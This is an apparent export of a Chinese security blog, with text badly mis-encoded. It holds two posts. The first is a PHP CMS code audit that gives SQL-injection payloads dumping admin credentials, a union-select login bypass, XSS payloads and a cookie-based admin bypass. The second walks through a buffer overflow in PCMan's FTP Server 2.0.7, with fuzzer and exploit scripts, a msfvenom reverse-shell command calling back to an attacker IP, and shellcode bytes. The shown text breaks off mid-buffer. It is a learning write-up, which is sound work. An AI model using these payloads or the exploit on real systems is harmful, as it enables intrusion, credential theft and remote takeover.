[&#x27;pltz&#x27;];//æ–°ç•™è¨€è¯„è®ºé€šçŸ¥if ($pltz==1)&#123; .... if ($type==1)&#123; $query = &quot;SELECT * FROM content WHERE( id= $cid)&quot;; $result = mysql_query($query) or die(&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;.mysql_error()); $wz = mysql_fetch_array($result); ..... if ($type==3)&#123; $query = &quot;SELECT * FROM download WHERE( id= $cid)&quot;; $result = mysql_query($query) or die(&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;.mysql_error()); $wz = mysql_fetch_array($result); $title=$wz[&#x27;title&#x27;]; .....&#125; è¿™ä¸ªæ¼æ´åˆ©ç”¨çš„å‰æ$pltz==1,ä¹Ÿå°±æ˜¯åå°é«˜çº§è®¾ç½®å¼€å¯æ–°è¯„è®º/ç•™è¨€é€šçŸ¥ç«™é•¿åŠŸèƒ½æ˜¯æ‰“å¼€çš„ã€‚ æ¼æ´åˆ©ç”¨ï¼š 1name=Tao&amp;mail=Tao1@qq.com&amp;url=http://www.baidu.com&amp;content=Taoæµ‹è¯•æµ‹è¯•å“ˆå“ˆå“ˆå“ˆ&amp;cid=1)+or+updatexml(1,concat(0x7e,(select+concat(user,0x3a,password)+from+manage)),1)# $type=&#39;comment&#39;=1è§¦å‘ $type=&#39;download&#39;=3è§¦å‘ åå°„å‹xssæ¼æ´è§¦å‘åœ¨files/contact.phpæ–‡ä»¶ 1234567$page=addslashes($_GET[&#x27;page&#x27;]);if ($page&lt;&gt;&quot;&quot;)&#123;if ($page&lt;&gt;1)&#123;$pages=&quot;ç¬¬&quot;.$page.&quot;é¡µ - &quot;;&#125;&#125;// 12~15è¡Œ $_GET[&#39;page&#39;]æœªè¿›è¡Œåªè¿›è¡Œäº†éƒ¨åˆ†å­—ç¬¦è½¬ä¹‰ï¼Œå…¶ä»–æœªä½œå¤„ç†å°±ç›´æ¥è¾“å‡ºäº†ã€‚ æ¼æ´è§¦å‘åœ¨files/list.phpæ–‡ä»¶ 1234567$yemas=$_GET[&#x27;page&#x27;];if ($yemas&lt;&gt;&quot;&quot;)&#123;$yema=&quot; - ç¬¬ $yemas é¡µ&quot;;&#125;else&#123;$yema=&quot;&quot;; &#125;// 23~28è¡Œ è·Ÿä¸Šé¢åŒç† æ¼æ´è§¦å‘åœ¨files/download.phpæ–‡ä»¶ å­˜å‚¨å‹xssæ¼æ´äº§ç”Ÿåœ¨files/submit.phpæ–‡ä»¶ä¸­ï¼Œæ˜µç§°æœªè¿›è¡Œå¤„ç†ï¼Œä¾¿å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ 12345678910111213$name=$_POST[&#x27;name&#x27;];$mail=$_POST[&#x27;mail&#x27;];$url=$_POST[&#x27;url&#x27;];$content=$_POST[&#x27;content&#x27;];$cid=$_POST[&#x27;cid&#x27;];$ip=$_SERVER[&quot;REMOTE_ADDR&quot;];$tz=$_POST[&#x27;tz&#x27;];.....$content= addslashes(strip_tags($content));//è¿‡æ»¤HTML....$query = &quot;INSERT INTO interaction (type,xs,cid,name,mail,url,touxiang,shebei,ip,content,tz,date) VALUES (&#x27;$type&#x27;,&#x27;$xs&#x27;,&#x27;$cid&#x27;,&#x27;$name&#x27;,&#x27;$mail&#x27;,&#x27;$url&#x27;,&#x27;$touxiang&#x27;,&#x27;$shebei&#x27;,&#x27;$ip&#x27;,&#x27;$content&#x27;,&#x27;$tz&#x27;,now())&quot;; åœ¨è¯„è®ºåŒºå¯ä»¥æäº¤æ˜µç§°ã€é‚®ç®±ã€ç½‘å€ã€å†…å®¹ã€‚ä½†æ˜¯æ˜¾ç¤ºè¯„è®ºå’Œç•™è¨€çš„åœ°æ–¹åªæ˜¾ç¤ºæ˜µç§°ã€‚æ‰€ä»¥åªæœ‰æ˜µç§°å¤„æ‰å­˜åœ¨å­˜å‚¨å‹XSS payload: Taoo&lt;img src=1 onerror=alert(/Tao/);&gt; å‰å°æ–‡ç« å¤„ æŸ¥çœ‹åå° å‚ç›´è¶Šæƒï¼ˆé€»è¾‘æ¼æ´ï¼‰æ¼æ´å‘ç°åœ¨inc/checklogin.php 1234567&lt;?php$user=$_COOKIE[&#x27;user&#x27;];if ($user==&quot;&quot;)&#123;header(&quot;Location: ?r=login&quot;);exit; &#125;?&gt; è¯¥ä»£ç å­˜åœ¨è¶Šæƒè®¿é—®ï¼Œè¿™é‡Œç›´æ¥ä»COOKIEå¤„èµ‹å€¼ç»™$userã€‚å¦‚æœ$userä¸ä¸ºç©ºå°±å¯ä»¥ç›´æ¥è®¿é—® æˆ‘ä»¬é€šè¿‡è°ƒè¯•æ¥åˆ†æä¸€ä¸‹åå°ç™»é™†çš„æ‰§è¡Œæµç¨‹ã€‚ é¦–å…ˆè®¿é—®adminç›®å½•ï¼Œé»˜è®¤è·³è½¬ä¼ å‚?r=login,ä¹Ÿå°±æ˜¯ä¸‹é¢çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œæ–‡ä»¶åŒ…å«admin/files/login.phpæ–‡ä»¶ ç„¶ååŒ…å«æ•°æ®åº“è¿æ¥æ–‡ä»¶ è¿™åé¢æ²¡æœ‰ä»€ä¹ˆï¼ˆè¿™æ˜¯æ­£å¸¸è®¿é—®ï¼Œè¾“å…¥è´¦å·å¯†ç çš„æµç¨‹ï¼‰ã€‚ ä½†æ˜¯æ³¨æ„æˆ‘ä»¬è¦åˆ©ç”¨æ­¤æ¼æ´çš„è¯ï¼Œéœ€è¦ä¿®æ”¹å®Œcookieåè®¿é—®admin/?r=index,admin/index.phpä¼šåŒ…å«filesæ–‡ä»¶å¤¹ä¸‹index.phpæ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œå®é™…è®¿é—®çš„æ–‡ä»¶å°±æ˜¯admin/files/index.php,æ–‡ä»¶å†…å®¹å¦‚ä¸‹ ç›´æ¥å°±åŒ…å«inc/checklogin.php 1234567&lt;?php$user=$_COOKIE[&#x27;user&#x27;];if ($user==&quot;&quot;)&#123;header(&quot;Location: ?r=login&quot;);exit; &#125;?&gt; $_COOKIE[&#39;user&#39;]ä¸ä¸ºç©ºå°±ä¸è·³è½¬åˆ°?r=login,ç›´æ¥è¿›å…¥åå° è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯ï¼Œæˆ‘ä»¬ä¿®æ”¹å®Œcookie,ä½¿å¾—$_COOKIE[&#39;user&#39;]ä¸ä¸ºç©ºã€‚ä¸ä¸€å®šéè¦è®¿é—®admin/?r=index,è®¿é—®æœ‰è½½å…¥inc/checklogin.phpæ–‡ä»¶éƒ½å¯ä»¥ æ¼æ´åˆ©ç”¨ï¼š è®°ä½ç®¡ç†å¤„è·¯åŠ²ï¼šhttp://www.bearsea.com/admin/?r=index é€€å‡ºç®¡ç†å‘˜ï¼Œæ¥åˆ°ç™»å½•å¤„ã€‚æ·»åŠ cookieå€¼ å†æ¬¡è®¿é—®åå°ã€‚æ²¡ç™»å½•ä¹Ÿç›´æ¥è¿›å…¥äº†åå°é¡µé¢ğŸ˜‚ åå°SQLæ³¨å…¥æ¼æ´äº§ç”Ÿæ–‡ä»¶admin/files/login.php 1234567$login=$_POST[&#x27;login&#x27;];$user=$_POST[&#x27;user&#x27;];$password=$_POST[&#x27;password&#x27;];$checkbox=$_POST[&#x27;checkbox&#x27;];if ($login&lt;&gt;&quot;&quot;)&#123;$query = &quot;SELECT * FROM manage WHERE user=&#x27;$user&#x27;&quot;; $queryå­˜åœ¨SQLæ³¨å…¥ï¼Œè¿™æ˜¯$useræœªç»è¿‡ä»»ä½•å¤„ç†ï¼Œç›´æ¥ä»£å…¥è¯­å¥ä¸­æ‰§è¡Œå¯¼è‡´çš„ åˆ©ç”¨æ–¹å¼ï¼š user: 1&#39; or updatexml(1,concat(0x7e,(select concat(user,0x3a,password) from manage)),1)# ç™»å½•ï¼Œè¿”å›ç®¡ç†å‘˜è´¦å·å’ŒåŠ å¯†çš„å¯†ç  åå°ä¸‡èƒ½å¯†ç ç™»å½•æ¼æ´äº§ç”Ÿæ–‡ä»¶admin/files/login.php 123456789101112131415161718$login=$_POST[&#x27;login&#x27;];$user=$_POST[&#x27;user&#x27;];$password=$_POST[&#x27;password&#x27;];$checkbox=$_POST[&#x27;checkbox&#x27;];if ($login&lt;&gt;&quot;&quot;)&#123;$query = &quot;SELECT * FROM manage WHERE user=&#x27;$user&#x27;&quot;;$result = mysql_query($query) or die(&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;.mysql_error());$users = mysql_fetch_array($result);if (!mysql_num_rows($result)) &#123; echo &quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;;exit;&#125;else&#123;$passwords=$users[&#x27;password&#x27;];if(md5($password)&lt;&gt;$passwords)&#123;echo &quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;;exit; &#125; $login æœªç»è¿‡ä»»ä½•å¤„ç†æ‹¼æ¥sqlè¯­å¥ï¼Œä¸”åªè¿›è¡Œäº†å¯†ç md5å¯¹æ¯”ã€‚å¯ç»•è¿‡ payload: userï¼š-1&#39; union select 1,2,3,&#39;ace1785ac351e22a3d18e594d77a67dd&#39;,5,6,7,8 # password: Tao åå°å¤šå¤„æ¼æ´åå°æš‚æ—¶ä¸å®¡äº†ï¼Œä¸‹æ¬¡ä¸€å®šğŸ‘Œ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://bobtaoy.github.io/categories/PHP/"},{"name":"webå®‰å…¨","slug":"PHP/webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/"},{"name":"ä»£ç å®¡è®¡","slug":"PHP/webå®‰å…¨/ä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHPä»£ç å®¡è®¡","slug":"PHPä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"PCMan's FTP Serverç¼“å†²åŒºæº¢å‡ºåˆ†æä¸åˆ©ç”¨","slug":"PCMan-s-FTP-Serverç¼“å†²åŒºæº¢å‡ºåˆ†æä¸åˆ©ç”¨","date":"2020-11-16T06:43:43.000Z","updated":"2021-02-23T12:07:11.918Z","comments":true,"path":"2020/11/16/PCMan-s-FTP-Serverç¼“å†²åŒºæº¢å‡ºåˆ†æä¸åˆ©ç”¨/","link":"","permalink":"https://bobtaoy.github.io/2020/11/16/PCMan-s-FTP-Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/","excerpt":"","text":"PCManâ€™s FTP Server ç¼“å†²åŒºæº¢å‡ºæ¼æ´åˆ©ç”¨å®éªŒç¯å¢ƒ WindowsXP-SP3ï¼ˆPCManâ€™s FTP Server 2.0.7ï¼Œ Immunityinc debugger, ï¼‰ æ”»å‡»æœºï¼škali 2.0 éœ€è¦çš„åŸºç¡€ï¼šå¯¹x86æ±‡ç¼–è¯­è¨€æœ‰ä¸€å®šçš„äº†è§£ï¼ŒpythonåŸºç¡€ï¼Œå¸¸ç”¨è°ƒè¯•å·¥å…·çš„ä½¿ç”¨ ç¼“å†²åŒºæº¢å‡ºåŸºç¡€è¯¦æƒ…å‚è€ƒï¼šç¼“å†²åŒºæº¢å‡ºåŸç†åˆ†æ(ä¸€) â€‹ ç®€å•çš„æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥çš„æ•°æ®é•¿åº¦è¶…è¿‡äº†å¼€å‘äººå‘˜å®šä¹‰çš„ç¼“å†²åŒºï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°æ®å°±å¯ä»¥è¦†ç›–æ‰å…³é”®çš„å¯„å­˜å™¨ï¼Œå¦‚EIPï¼ŒEIPæ˜¯æŒ‡ä»¤å¯„å­˜å™¨ï¼Œå®ƒå­˜æ”¾å½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚å¦‚æœå®ƒè¢«æ¥è‡ªç”¨æˆ·è¾“å…¥çš„åƒåœ¾æ•°æ®è¦†ç›–äº†ï¼Œç¨‹åºé€šå¸¸ä¼šå´©æºƒï¼Œå› ä¸ºå®ƒè·³è½¬åˆ°çš„åœ°å€å¹¶å°è¯•æŒ‡å‘ï¼Œä½†æ‰§è¡Œçš„å¹¶ä¸æ˜¯æœ‰æ•ˆçš„æŒ‡ä»¤ã€‚æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è¦å®šåˆ¶ä¸€ä¸ªæ•°æ®å‘é€åˆ°ç¨‹åºè¦†ç›–EIPï¼Œä½¿ç¨‹åºè·³è½¬åˆ°æˆ‘ä»¬æ§åˆ¶çš„ä½ç½®ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œshellcodeäº† å›¾ç‰‡æ¥æºï¼šhttp://www.legendsec.org/2020.html æŸ¥æ‰¾ç¼“å†²åŒºæº¢å‡ºæ¨¡ç³Šæµ‹è¯•(Fuzzing)è¦å®Œæˆä¸€æ¬¡ç¼“å†²åŒºæº¢å‡ºæµ‹è¯•ï¼Œæˆ‘ä»¬å°±éœ€è¦çŸ¥é“å“ªé‡Œä¼šå‘ç”Ÿç¼“å†²åŒºæº¢å‡ºï¼Œæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦è¿›è¡Œæ¨¡ç³Šæµ‹è¯•(fuzzing),ç°åœ¨æˆ‘ä»¬éœ€è¦å‘é€ä¸åŒé•¿åº¦å’Œå†…å®¹çš„è‡ªå®šä¹‰å­—ç¬¦ä¸²æ‰¾åˆ°æˆ‘ä»¬è¦æµ‹è¯•çš„è¾“å…¥ç‚¹ï¼Œå¦‚æœç¨‹åºå´©æºƒ,é‚£ä¹ˆæˆ‘ä»¬å°±ä½¿ç”¨è°ƒè¯•å·¥å…·è°ƒæŸ¥ä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šå´©æºƒï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨,è¿™é‡Œæˆ‘ä»¬ä»¥PCManâ€™s FTP Server 2.0.7ä¸ºä¾‹å­ é¦–å…ˆæˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹ç”¨æˆ·åè¿™ä¸ªè¾“å…¥ç‚¹æœ‰æ²¡æœ‰å­˜åœ¨é—®é¢˜ã€‚è¿™é‡Œæˆ‘ä»¬ç”¨Pythonç¼–å†™äº†ä¸€ä¸ªFuzzerç¨‹åº 123456789101112131415161718192021222324#!/usr/bin/env pythonimport sysimport sockethost = sys.argv[1] # receive IPport = int(sys.argv[2]) # receive portfuzz = 100while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(&quot;USER &quot; + &quot;A&quot; * fuzz) s.recv(1024) s.send(&quot;PASS Tao&quot;) s.recv(1024) print &quot;Send str length: &quot; + str(fuzz) fuzz += 100 except Exception,err: print&quot;End..., Send str length: &quot; + str(fuzz) sys.exit() finally: s.close() é¦–å…ˆæˆ‘ä»¬æ‰“å¼€PCmanFTPè¿è¡Œç¨‹åºï¼š ä½¿ç”¨./fuzzing.py 172.16.10.156 21, è¿è¡Œè„šæœ¬ï¼Œå‘ç°å‘é€åˆ°å¤§çº¦2000çš„æ—¶å€™æŒ‚èµ·äº†ï¼Œæ£€æŸ¥æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¯ä»¥å‘ç°å·²ç»å´©æºƒã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦æ¥è¿›ä¸€æ­¥ç ”ç©¶ä¸€ä¸‹ï¼Œç¡®è®¤è¿™é”™è¯¯æ˜¯å¦å¯ä»¥åˆ©ç”¨ï¼Œæˆ‘ä»¬é‡æ–°å¯åŠ¨PCmanFTPç¨‹åº å´©æºƒè°ƒæŸ¥æ‰“å¼€Immunityinc debuggerï¼Œç„¶åFile-&gt;Attach (é¦–å…ˆè¦ç¡®ä¿FTPç¨‹åºå·²ç»åœ¨è¿è¡Œ) å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ­¤æ—¶ç¨‹åºå·²ç»åŠ è½½è¿›æ¥ï¼Œæ˜¯æš‚åœçŠ¶æ€ï¼Œ æˆ‘ä»¬ä½¿ç”¨å¿«æ·é”®F9è®©ç¨‹åºè·‘èµ·æ¥ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨èœå•æ çš„è¿è¡ŒæŒ‰é’® å½“ç¨‹åºå¤„äºRunningçŠ¶æ€çš„æ—¶å€™ï¼Œæˆ‘ä»¬å†ä¸€æ¬¡è¿è¡Œfuzzing.pyè„šæœ¬ã€‚ æ­¤æ—¶æˆ‘ä»¬ç¨‹åºå´©æºƒï¼Œä½†æ˜¯è¿™é‡Œçš„EIPå€¼å¹¶æ²¡æœ‰è¦†ç›–æˆæˆ‘ä»¬æƒ³è¦41414141, ä½†æ˜¯æ ¹æ®ç¨‹åºè¾“å‡ºæˆ‘ä»¬å¯çŸ¥ï¼Œå‘é€å­—ç¬¦è¾¾åˆ°2000æ—¶ä½¿å¾—ç¨‹åºå´©æºƒï¼Œæ­¤æ—¶æˆ‘ä»¬çŒœæµ‹2000æ˜¯å¤§æ¦‚çš„æº¢å‡ºä½ç½®ï¼ˆå› ä¸ºè¿™é‡Œåˆšå¥½å¯¼è‡´äº†ç¨‹åºæº¢å‡ºï¼Œä½†å¹¶æ²¡æœ‰è¦†ç›–è¿”å›åœ°å€ï¼‰æˆ‘ä»¬å†ä¸€æ¬¡æµ‹è¯•ï¼Œè¿™æ¬¡æµ‹è¯•å°†æ­¥é•¿ä¿®æ”¹ä¸º150, ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324#!/usr/bin/env pythonimport sysimport sockethost = sys.argv[1] # receive IPport = int(sys.argv[2]) # receive portfuzz = 100while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(&quot;USER &quot; + &quot;A&quot; * fuzz) s.recv(1024) s.send(&quot;PASS Tao&quot;) s.recv(1024) print &quot;Send str length: &quot; + str(fuzz) fuzz += 150 # modify this except Exception,err: print&quot;End..., Send str length: &quot; + str(fuzz) sys.exit() finally: s.close() ç¨‹åºè¾“å‡ºï¼š ä¸Šå›¾æˆ‘ä»¬å¯ä»¥å‘ç°EIPå¯„å­˜å™¨çš„å€¼æ˜¯41414141ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ§åˆ¶EIPï¼ˆè¿™ä¹Ÿæ„å‘³ç€æˆ‘ä»¬ä¸Šé¢çš„çŒœæƒ³æ˜¯æ­£ç¡®çš„ï¼‰ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬è¦è§£å†³çš„é—®é¢˜å°±æ˜¯å“ªé‡Œçš„Aå°†EIPè¦†ç›–äº†å‘¢ï¼Ÿ æŸ¥æ‰¾åç§»æ•°ï¼ˆFinding the offsetï¼‰ä½¿ç”¨Metasploitçš„pattern_createå·¥å…·åˆ›å»ºä¸€ä¸ª500å¤§å°çš„å­—ç¬¦ä¸²ï¼Œ å› ä¸ºæˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„æµ‹è¯•ï¼Œå¤§æ¦‚åˆ¤æ–­æº¢å‡ºå­—ç¬¦åœ¨1900~2050, é‚£ä¹ˆæˆ‘ä»¬å¡«å†™&#39;A&#39; * 1900 + &quot;å·¥å…·ç”Ÿæˆå­—ç¬¦&quot; æ„æˆpayloadå‘é€è‡³FTPæœåŠ¡ç«¯ï¼Œå¦‚ä¸Šæ“ä½œï¼Œæˆ‘ä»¬è®©ç¨‹åºåœ¨Immunityinc debuggerä¸­è¿è¡Œèµ·æ¥,ç„¶åæ‰§è¡Œå¦‚ä¸‹ç¨‹åºï¼š 12345678910111213141516#!/usr/bin/env python# filename: findoffset.pyimport sysimport socketpayload = &quot;A&quot; * 1900 + &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&quot;host = sys.argv[1] # receive IPport = int(sys.argv[2]) # receive ports = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, port))s.send(&quot;USER &quot; + payload)s.recv(1024)s.send(&quot;PASS Tao&quot;)s.recv(1024) å¯ä»¥å‘ç°ï¼Œè¿™ä¸€æ¬¡EIPå¯„å­˜å™¨çš„å€¼æ˜¯0x34644133, ä¸ºäº†è®¡ç®—è¿™ä¸ªå€¼åç§»é‡ï¼Œæˆ‘ä»¬ä½¿ç”¨Metasploitä¸­çš„å¦ä¸€ä¸ªå·¥å…·pattern_offsetæ¥ç¡®å®šå­—èŠ‚æ•° 123./pattern_offset.rb -l 500 -q 34644133# -qå‚æ•°ä¸ºè¦æŸ¥è¯¢çš„åœ°å€ï¼Œ-lå‚æ•°ä¸ºè¦æŸ¥è¯¢çš„å­—ç¬¦åºåˆ—çš„é•¿åº¦# ä¸Šå›¾ä¸­æˆ‘ä»¬å¾—å‡ºçš„åœ°å€æ˜¯ 0x34644133, è€Œç”Ÿæˆçš„å­—ç¬¦ä¸²é•¿åº¦ä¸º500ï¼Œ å› æ­¤è¿™é‡Œä½¿ç”¨ -l 500 -q 34644133 è®¡ç®—ç»“æœä¸º101, ä¹Ÿå°±æ˜¯è¯´è¦†ç›–è¿”å›åœ°å€æ˜¯åœ¨[2002-2005] è¿™å››ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹ï¼š æ³¨æ„ï¼Œä¸‹å›¾çš„1900 æ˜¯æˆ‘ä»¬ä¸Šé¢findoffset.pyè¿™ä¸ªç¨‹åºpyloadä¸­çš„Aå­—ç¬¦æ•°ï¼Œè€Œåç§»é‡ä¸º101ï¼Œé‚£ä¹ˆæœ€ç»ˆè¦†ç›–EIPå‰çš„å­—ç¬¦æ•°å°±æ˜¯1900+101=2001ä¸ªå­—ç¬¦ 123456789101112131415#!/usr/bin/env python# filename: overeip.pyimport sysimport socketpayload = &quot;A&quot; * 2001 + &quot;B&quot; * 4host = sys.argv[1] # receive IPport = int(sys.argv[2]) # receive ports = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, port))s.send(&quot;USER &quot; + payload)s.recv(1024)s.send(&quot;PASS Tao&quot;)s.recv(1024) æ‰§è¡Œç¨‹åºï¼š æŸ¥çœ‹windows xpï¼Œå‘ç°EIPï¼ˆç¨‹åºè¿”å›åœ°å€ï¼‰è¢«æˆ‘ä»¬ä¸Šé¢çš„4ä¸ªBç»™è¦†ç›–äº†ï¼Œåˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥ç²¾ç¡®çš„è¦†ç›–EIPäº† å¯»æ‰¾shellcodeä½ç½®æˆ‘ä»¬åœ¨ä¸Šé¢ç¨‹åºpyloadåé¢åŠ 100ä¸ªCï¼Œç„¶åæ‰§è¡Œ å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡ŒESPæŒ‡å‘çš„æ˜¯æˆ‘ä»¬åœ¨EIPåé¢ç»™çš„100ä¸ªC, ç°åœ¨æˆ‘ä»¬æ˜¯è¦å°†Cæ›¿æ¢æˆæˆ‘ä»¬å¸Œæœ›è¿è¡Œçš„Shellcodeã€‚ç„¶åè®©EIPè·³è½¬åˆ°ESPå¯„å­˜å™¨çš„ä½ç½® è·å¾— EIP to jumpä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸èƒ½å‘Šè¯‰EIPå»å†…å­˜åœ°å€0x0012EDB8å‘¢ï¼Ÿå› ä¸ºè¿™ä¸ªåœ°å€åœ¨å„ä¸ªè®¡ç®—æœºä¸Šéƒ½ä¸ä¸€æ ·å¾—ï¼Œä½ ä¸å¯èƒ½åªæƒ³è¿™ä¸ªæ”»å‡»åªèƒ½æ”»å‡»è‡ªå·±è®¡ç®—æœºå§ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±è¦åœ¨ç¨‹åºçš„dllä¸­æ‰¾åˆ°å…·æœ‰JMP ESPå‘½ä»¤çš„å†…å­˜åœ°å€ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å°†EIPæŒ‡å‘è¯¥ä½ç½®ï¼Œä½¿å…¶è·³è½¬åˆ°æˆ‘ä»¬çš„ç¼“å†²åŒºä¸­ã€‚ æˆ‘ä»¬è¿™é‡Œä½¿ç”¨Immunityinc debugger åœ¨ç¨‹åºçš„dllä¸­æ‰¾åˆ°å…·æœ‰JMP ESPå‘½ä»¤çš„å†…å­˜åœ°å€ çœ‹çœ‹æœ‰å“ªäº›dllåŠ è½½åˆ°äº†è¿™ä¸ªç¨‹åº è¿™é‡Œæˆ‘ä»¬é€‰æ‹©kernel32.dll è¿›è¡Œæœç´¢ï¼Œ æœç´¢JMP ESPå‘½ä»¤ å³é”®-&gt; Search for -&gt; Command -&gt; è¾“å‡ºjmp esp æœç´¢ è¿™é‡Œè¿”å›çš„å†…å­˜åœ°å€ä¸º0x7C86467B, è¿™ä¸ªåœ°å€æ²¡æœ‰åå­—ç¬¦ï¼ˆåå­—ç¬¦æ˜¯ä¼šç ´åæˆ‘ä»¬æ¼æ´çš„å­—ç¬¦ï¼Œå¦‚0x00ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥æ¥åˆ©ç”¨,å› ä¸ºè¿™é‡Œæˆ‘ä»¬æ˜¯å°ç«¯æ˜¾ç¤ºï¼Œæ‰€ä»¥æ„é€ shellcodeçš„æ—¶å€™éœ€è¦å€’è¿‡æ¥å†™ï¼ ç”Ÿæˆshellcode12msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.143 LPORT=1234 EXITFUNC=thread -f python -b &quot;\\x00\\x0a\\x0d&quot; -a x86# 0x0Aè¡¨ç¤ºå›è½¦ï¼Œ0x0Dè¡¨ç¤ºæ¢è¡Œï¼Œ0x00è¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“æŸï¼Œ è¿™äº›éƒ½æ˜¯åå­—ç¬¦ï¼Œä¼šç ´ç¯æˆ‘ä»¬çš„payload æˆ‘ä»¬åœ¨æœ€åè·³è½¬åœ°å€åŠ å…¥è‹¥å¹²NOPå­—ç¬¦ï¼ŒNOPä»£è¡¨è·³è¿‡ï¼Œæ„å‘³ç€ä»€ä¹ˆéƒ½ä¸éœ€è¦æ“ä½œï¼Œå¹¶ä¸”æŒ‡ç¤ºCPUè·³è¿‡æ­¤æŒ‡ä»¤ã€‚æœ‰æ—¶å€™å¯ä»¥é€šè¿‡åœ¨shellcodeå‰å¡«å……NOPå¢åŠ æ¼æ´åˆ©ç”¨ç¨‹åºå’Œshellcodeå¯é æ€§ã€‚è¿™é‡Œæˆ‘æ·»åŠ 30ä¸ªNOPï¼Œä»¥æé«˜å¯é æ€§ã€‚æœ€ç»ˆexpç¨‹åºä¸ºï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python# filename: exp.pyimport sysimport socketbuf = &quot;&quot;buf += &quot;\\xdb\\xd5\\xbd\\x8c\\x36\\xb0\\x37\\xd9\\x74\\x24\\xf4\\x58\\x2b&quot;buf += &quot;\\xc9\\xb1\\x52\\x31\\x68\\x17\\x83\\xe8\\xfc\\x03\\xe4\\x25\\x52&quot;buf += &quot;\\xc2\\x08\\xa1\\x10\\x2d\\xf0\\x32\\x75\\xa7\\x15\\x03\\xb5\\xd3&quot;buf += &quot;\\x5e\\x34\\x05\\x97\\x32\\xb9\\xee\\xf5\\xa6\\x4a\\x82\\xd1\\xc9&quot;buf += &quot;\\xfb\\x29\\x04\\xe4\\xfc\\x02\\x74\\x67\\x7f\\x59\\xa9\\x47\\xbe&quot;buf += &quot;\\x92\\xbc\\x86\\x87\\xcf\\x4d\\xda\\x50\\x9b\\xe0\\xca\\xd5\\xd1&quot;buf += &quot;\\x38\\x61\\xa5\\xf4\\x38\\x96\\x7e\\xf6\\x69\\x09\\xf4\\xa1\\xa9&quot;buf += 